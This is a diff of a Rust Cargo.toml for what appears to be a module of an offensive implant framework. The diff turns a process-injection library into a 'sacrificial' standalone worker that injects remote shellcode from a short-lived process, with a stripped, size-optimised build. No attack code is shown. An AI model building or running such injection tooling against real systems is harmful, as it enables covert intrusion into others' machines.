@@ -1,20 +1,18 @@
 [package]
-name = "cupcake-mod-inject"
+name = "cupcake-inject-worker"
 version = "0.1.0"
 edition = "2021"
-description = "L2 process inject module — remote shellcode via PEB/Nt (on-demand only)"
+description = "Sacrificial L2 inject worker PE — remote shellcode from a short-lived process (on-demand only)"
 
-[lib]
-name = "cupcake_mod_inject"
-crate-type = ["cdylib", "rlib"]
-doctest = false
+[[bin]]
+name = "cupcake-inject-worker"
+path = "src/main.rs"
 
 [dependencies]
 # Only inject surface from core — no transport / Stage0 monolith
 cupcake-core = { path = "../../core", default-features = false, features = ["inject"] }
 serde_json = { version = "1.0", default-features = false, features = ["std"] }
 base64 = { version = "0.21", default-features = false, features = ["std"] }
-log = { version = "0.4", default-features = false }
 
-[target.'cfg(windows)'.dependencies]
-winapi = { version = "0.3", features = ["winnt", "memoryapi"] }
+# Release profile is defined once in the workspace root (Client/Cargo.toml):
+# opt-level="z", lto="fat", codegen-units=1, panic="abort", strip="symbols".
